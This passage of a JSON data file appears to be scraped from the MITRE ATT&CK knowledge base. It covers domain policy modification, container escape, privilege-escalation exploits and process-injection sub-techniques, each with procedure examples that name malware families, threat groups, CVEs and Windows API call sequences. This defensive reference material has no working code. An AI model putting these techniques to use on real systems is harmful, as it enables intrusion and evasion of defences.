                        "Name": "Scattered Spider",
                        "Description": "<name> adds a federated identity provider to the victim\u2019s SSO tenant and activates automatic account linking.[6]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.[7][8]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment[1][2][3]modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources[4]changing configuration settings within the AD environment to implement a Rogue Domain Controller.adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant [5]Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
        "Procedure": {}
    },
    "T1611": {
        "ttp_name": "Escape to Host",
        "ttp_id": "T1611",
        "href": "/techniques/T1611",
        "tactic": "Privilege Escalation",
        "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.[1]There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as unshare and keyctl to escalate privileges and steal secrets.[2][3][4][5][6][7]Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as docker.sock, to break out of the container via a Container Administration Command.[5] Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.[8]Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.",
        "Procedure": {
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware\u2019s container was configured to bind the host root directory.[4]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has used the BOtB tool that can break out of containers. [9]"
            },
            "S0683": {
                "ID": "S0683",
                "Name": "Peirates",
                "Description": "malware can gain a reverse shell on a host node by mounting the Kubernetes hostPath.[10]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware maps the host\u2019s C drive to the container by creating a global symbolic link to the host through the calling of NtSetInformationSymbolicLink.[11]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has deployed privileged containers that mount the filesystem of victim machine.[12][13]"
            }
        }
    },
    "T1068": {
        "ttp_name": "Exploitation for Privilege Escalation",
        "ttp_id": "T1068",
        "href": "/techniques/T1068",
        "tactic": "Privilege Escalation",
        "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).[1][2] Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.[3][4][5]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has exploited CVE-2021-36934 to escalate privileges on a compromised host.[6]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has used CVE-2016-7255 to escalate privileges.[7]"
            },
            "G0064": {
                "ID": "G0064",
                "Name": "APT33",
                "Description": "malware has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.[8]"
            },
            "G1002": {
                "ID": "G1002",
                "Name": "BITTER",
                "Description": "malware has exploited CVE-2021-1732 for privilege escalation.[9][10]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 abused named pipe impersonation for privilege escalation.[11]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.[12][13]"
            },
            "G0080": {
                "ID": "G0080",
                "Name": "Cobalt Group",
                "Description": "malware has used exploits to increase their levels of rights and privileges.[14]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can exploit vulnerabilities such as MS14-058.[15][16]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.[17]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can exploit vulnerabilities such as MS16-032 and MS16-135.[18]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.[19]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has exploited the CVE-2016-0167 local vulnerability.[20][21]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has used the BOtB tool which exploits CVE-2019-5736.[22]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.[1]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "malware has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.[23][24]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation.[25]"
            },
            "G1019": {
                "ID": "G1019",
                "Name": "MoustachedBouncer",
                "Description": "malware has exploited CVE-2021-1732 to execute malware components with elevated rights.[26]"
            },
            "S0664": {
                "ID": "S0664",
                "Name": "Pandora",
                "Description": "malware can use CVE-2017-15303 to bypass Windows Driver Signature Enforcement (DSE) protection and load its driver.[27]"
            },
            "G0068": {
                "ID": "G0068",
                "Name": "PLATINUM",
                "Description": "malware has leveraged a zero-day vulnerability to escalate privileges.[28]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.[29]"
            },
            "S0654": {
                "ID": "S0654",
                "Name": "ProLock",
                "Description": "malware can use CVE-2019-0859 to escalate privileges on a compromised host.[30]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.[31]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys).[32]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware has leveraged a vulnerability in Windows containers to perform an Escape to Host.[33]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.[34]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.[35][36]"
            },
            "G0131": {
                "ID": "G0131",
                "Name": "Tonto Team",
                "Description": "malware has exploited CVE-2019-0803 and MS16-032 to escalate privileges.[37]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.[2]"
            },
            "G0107": {
                "ID": "G0107",
                "Name": "Whitefly",
                "Description": "malware has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.[38]"
            },
            "S0176": {
                "ID": "S0176",
                "Name": "Wingbird",
                "Description": "malware exploits CVE-2016-4117 to allow an executable to gain escalated privileges.[39]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware has used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP.[40]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has exploited CVE-2017-0005 for local privilege escalation.[41]"
            },
            "S0672": {
                "ID": "S0672",
                "Name": "Zox",
                "Description": "malware has the ability to leverage local and remote exploits to escalate privileges.[42]"
            }
        }
    },
    "T1055": {
        "ttp_name": "Process Injection",
        "ttp_id": "T1055",
        "href": "/techniques/T1055",
        "subtechnique": {
            "001": {
                "name": "Dynamic-link Library Injection",
                "href": "/techniques/T1055/001",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL). [1] Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary).[2][1] Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's AddressOfEntryPoint before starting a new thread in the target process.[3] This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.[4] Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S0456": {
                        "ID": "S0456",
                        "Name": "Aria-body",
                        "Description": "<name> has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.[5]"
                    },
                    "G0135": {
                        "ID": "G0135",
                        "Name": "BackdoorDiplomacy",
                        "Description": "<name> has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.[6]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> has the ability to execute a malicious DLL by injecting into explorer.exe on a compromised machine.[7]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "<name> injects its DLL component into svchost.exe.[8]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "The <name> loader can support the Dij command which gives it the ability to inject DLLs into the memory of other processes.[9][10]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors used a DLL named D8B3.dll that was injected into the Winlogon process.[11]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name>'s bootkit can inject a malicious DLL into the address space of running processes.[12]"
                    },
                    "S0335": {
                        "ID": "S0335",
                        "Name": "Carbon",
                        "Description": "<name> has a command to inject code into a process.[13]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> has the ability to load DLLs via reflective injection.[14][15]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has injected its orchestrator DLL into explorer.exe. <name> has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.[16][17]"
                    },
                    "S0575": {
                        "ID": "S0575",
                        "Name": "Conti",
                        "Description": "<name> has loaded an encrypted DLL into memory and then executes it.[18][19]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> can use a .NET-based DLL named RunPe6 for process injection.[20]"
                    },
                    "S0021": {
                        "ID": "S0021",
                        "Name": "Derusbi",
                        "Description": "<name> injects itself into the secure shell (SSH) process.[21]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "<name> will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (<name> will inject into different processes depending on which security suite is installed on the infected host).[22]"
                    },
                    "S0024": {
                        "ID": "S0024",
                        "Name": "Dyre",
                        "Description": "<name> injects into other processes to load modules.[23]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> injects DLL files into iexplore.exe.[24][25]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "<name> injects its DLL file into a newly spawned Internet Explorer process.[26]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed injecting in to Explorer.exe and other processes. [27][28][29]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> injects itself into various processes depending on whether it is low integrity or high integrity.[30][31]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "The <name> FilepakMonitor component can inject into the Bka.exe process using the VirtualAllocEx, WriteProcessMemory and CreateRemoteThread APIs to load the DLL component.[32]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> has the ability to inject DLLs into specific processes.[33]"
                    },
                    "S0460": {
                        "ID": "S0460",
                        "Name": "Get2",
                        "Description": "<name> has the ability to inject DLLs into processes.[34]"
                    },
                    "S1027": {
                        "ID": "S1027",
                        "Name": "Heyoka Backdoor",
                        "Description": "<name> can inject a DLL into rundll32.exe for execution.[35]"
                    },
                    "S0135": {
                        "ID": "S0135",
                        "Name": "HIDEDRV",
                        "Description": "<name> injects a DLL for Downdelph into the explorer.exe process.[36]"
                    },
                    "S0581": {
                        "ID": "S0581",
                        "Name": "IronNetInjector",
                        "Description": "<name> has the ability to inject a DLL into running processes, including the <name> DLL into explorer.exe.[37]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "If running in a Windows environment, <name> saves a DLL to disk that is injected into the explorer.exe process to execute the payload. <name> can also be configured to inject and execute within specific processes.[38]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can perform process injection by using a reflective DLL.[39]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "A <name> malware sample performs reflective DLL injection.[40][41]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.[42]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading.[43]"
                    },
                    "G1026": {
                        "ID": "G1026",
                        "Name": "Malteiro",
                        "Description": "<name> has injected Mispadu\u2019s DLL into a process.[44]"
                    },
                    "S0167": {
                        "ID": "S0167",
                        "Name": "Matryoshka",
                        "Description": "<name> uses reflective DLL injection to inject the malicious library and execute the RAT.[45]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> has injected the malware DLL into a target process.[46][47]"
                    },
                    "S0576": {
                        "ID": "S0576",
                        "Name": "MegaCortex",
                        "Description": "<name> loads injecthelper.dll into a newly created rundll32.exe process.[48]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).[49]"
                    },
                    "S1026": {
                        "ID": "S1026",
                        "Name": "Mongall",
                        "Description": "<name> can inject a DLL into rundll32.exe for execution.[35]"
                    },
                    "S0457": {
                        "ID": "S0457",
                        "Name": "Netwalker",
                        "Description": "The <name> DLL has been injected reflectively into the memory of a legitimate running process.[50]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> can inject its modules into various processes using reflective DLL loading.[51]"
                    },
                    "S0012": {
                        "ID": "S0012",
                        "Name": "PoisonIvy",
                        "Description": "<name> can inject a malicious DLL into a process.[52][53]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.[54][55]"
                    },
                    "S0613": {
                        "ID": "S0613",
                        "Name": "PS1",
                        "Description": "<name> can inject its payload DLL Into memory.[56]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can migrate into another process using reflective DLL injection.[57]"
                    },
                    "G0024": {
                        "ID": "G0024",
                        "Name": "Putter Panda",
                        "Description": "An executable dropped onto victims by <name> aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).[58]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can use ImprovedReflectiveDLLInjection to deploy components.[59]"
                    },
                    "S0055": {
                        "ID": "S0055",
                        "Name": "RARSTONE",
                        "Description": "After decrypting itself in memory, <name> downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This \"downloaded\" file is actually not dropped onto the system.[60]"
                    },
                    "S0241": {
                        "ID": "S0241",
                        "Name": "RATANKBA",
                        "Description": "<name> performs a reflective DLL injection using a given pid.[61][62]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> can perform DLL injection.[63]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has injected its DLL component into EhStorAurhn.exe.[64]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has the ability to inject a downloaded DLL into a newly created rundll32.exe process.[34]"
                    },
                    "S0596": {
                        "ID": "S0596",
                        "Name": "ShadowPad",
                        "Description": "<name> has injected a DLL into svchost.exe.[65]"
                    },
                    "S0273": {
                        "ID": "S0273",
                        "Name": "Socksbot",
                        "Description": "<name> creates a suspended svchost process and injects its DLL into it.[66]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> can execute loadfromfile, loadfromstorage, and loadfrommem to inject a DLL  from disk, storage, or memory respectively.[56]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> injects an entire DLL into an existing, newly created, or preselected trusted process.[67]"
                    },
                    "S0018": {
                        "ID": "S0018",
                        "Name": "Sykipot",
                        "Description": "<name> injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.[68]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has been seen injecting a DLL into winword.exe.[69]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> can perform DLL loading.[70][71]"
                    },
                    "S0467": {
                        "ID": "S0467",
                        "Name": "TajMahal",
                        "Description": "<name> has the ability to inject DLLs for malicious plugins into running processes.[72]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has injected a DLL backdoor into dllhost.exe and svchost.exe.[73][74]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used Metasploit to perform reflective DLL injection in order to escalate privileges.[75][76]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can use DLL injection to load embedded files and modules.[77]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has injected malicious DLLs into memory with read, write, and execute permissions.[78][79]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> is injected into a shared SVCHOST process.[80]"
                    }
                }
            },
            "002": {
                "name": "Portable Executable Injection",
                "href": "/techniques/T1055/002",
                "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. [1] Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> downloads an executable and injects it directly into a new process.[2]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> malware can download a remote access tool, ShiftyBug, and inject into another process.[3]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> has a module to inject a PE binary into a remote process.[4]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can inject its backdoor as a portable executable into a target process.[5]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> can execute PE files in the address space of the specified process.[6]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name>'s miner, \"TermsHost.exe\", evaded defenses by injecting itself into Windows processes, including Notepad.exe.[7]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> checks processes on the system and if they meet the necessary requirements, it injects into that process.[8]"
                    }
                }
            },
            "003": {
                "name": "Thread Execution Hijacking",
                "href": "/techniques/T1055/003",
                "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.[1]This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.[2][3]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API.[4]"
                    },
                    "S0579": {
                        "ID": "S0579",
                        "Name": "Waterbear",
                        "Description": "<name> can use thread injection to inject shellcode into the process of security software.[5]"
                    }
                }
            },
            "004": {
                "name": "Asynchronous Procedure Call",
                "href": "/techniques/T1055/004",
                "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue [1] of a process's thread. Queued APC functions are executed when the thread enters an alterable state.[1] A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL). A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. [2] AtomBombing [3] is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.[4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> performs the injection by attaching its code into the APC queue using NtQueueApcThread API.[5]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can inject itself into a new svchost.exe -k netsvcs process using the asynchronous procedure call (APC) queue.[6][7]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can use asynchronous procedure call (APC) injection to execute commands received from C2.[8]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has queued an APC routine to explorer.exe by calling ZwQueueApcThread.[9]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has injected malicious code into a new svchost.exe process.[10]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has used ZwQueueApcThread to inject itself into remote processes.[11]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can inject its code into a trusted process via the APC queue.[12]"
                    },
                    "S0517": {
                        "ID": "S0517",
                        "Name": "Pillowmint",
                        "Description": "<name> has used the NtQueueApcThread syscall to inject code into svchost.exe.[13]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has written its payload into a newly-created EhStorAuthn.exe process using ZwWriteVirtualMemory and executed it using NtQueueApcThread and ZwAlertResumeThread.[14]"
                    },
                    "S1085": {
                        "ID": "S1085",
                        "Name": "Sardonic",
                        "Description": "<name> can use the QueueUserAPC API to execute shellcode on a compromised machine.[15]"
                    },
                    "S0199": {
                        "ID": "S0199",
                        "Name": "TURNEDUP",
                        "Description": "<name> is capable of injecting code into the APC queue of a created Rundll32 process as part of an \"Early Bird injection.\"[2]"
                    }
                }
            },
            "005": {
                "name": "Thread Local Storage",
                "href": "/techniques/T1055/005",
                "description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other Process Injection techniques such as Process Hollowing.[1]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has injected code into target processes via thread local storage callbacks.[2][3][4]"
                    }
                }
            },
            "008": {
                "name": "Ptrace System Calls",
                "href": "/techniques/T1055/008",
                "description": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.[1] Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: malloc) then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute. Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction). [1][2] Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.[3] Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "Procedure": {
                    "S1109": {
                        "ID": "S1109",
                        "Name": "PACEMAKER",
                        "Description": "<name> can use PTRACE to attach to a targeted process to read process memory.[4]"
                    }
                }
            },
            "009": {
                "name": "Proc Memory",
                "href": "/techniques/T1055/009",
